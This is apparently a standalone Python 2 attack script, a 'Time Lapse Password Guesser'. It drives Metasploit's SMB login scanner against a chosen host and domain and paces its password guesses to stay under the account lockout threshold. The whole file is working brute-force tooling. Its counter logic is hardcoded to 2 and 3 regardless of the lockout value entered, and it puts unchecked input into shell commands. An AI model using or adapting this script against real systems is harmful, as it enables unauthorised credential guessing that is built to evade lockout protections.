#!/usr/bin/python

import time
import os
import sys

if len(sys.argv) < 3:
	print "Usage: "+sys.argv[0]+" <username file> <password file>" 
	sys.exit()

if os.path.isfile("pass_file.tmp") == True:
	os.system('rm pass_file.tmp')

os.system('clear')
print "--- Time Lapse Password Guesser ---"
print "Please use with caution and intelligence"
print ""
user_file=sys.argv[1]
pass_file=sys.argv[2]
target = raw_input("Please enter SMB target: [example: 192.168.1.10]: ")
domain = raw_input("Please enter the Domain name: [example: example.com]: ")
tries = int(raw_input("Please enter the tries before lockout: [example: 3]: "))
reset = int(raw_input("Please enter the reset timer in minutes: [example: 30]: "))

starttime = time.time()


with open(pass_file,"r") as pfile:
	counttries = tries
	for line in pfile:
		if counttries == 2:
			print "Hit Maximum Attempts, sleeping for " + str(reset+5) + " minutes."
			time.sleep((reset+5)*60)
			counttries = tries
			os.system('rm pass_file.tmp')
		with open("pass_file.tmp", "a") as tmpfile:
			tmpfile.writelines(line)
		tmpfile.close()
		if counttries ==3:
			os.system('msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS '+target+'; set SMBDOMAIN '+domain+'; set USER_FILE '+user_file+'; set PASS_FILE pass_file.tmp;spool TimeLapse.log; run; 	exit"')
		counttries = counttries - 1


		
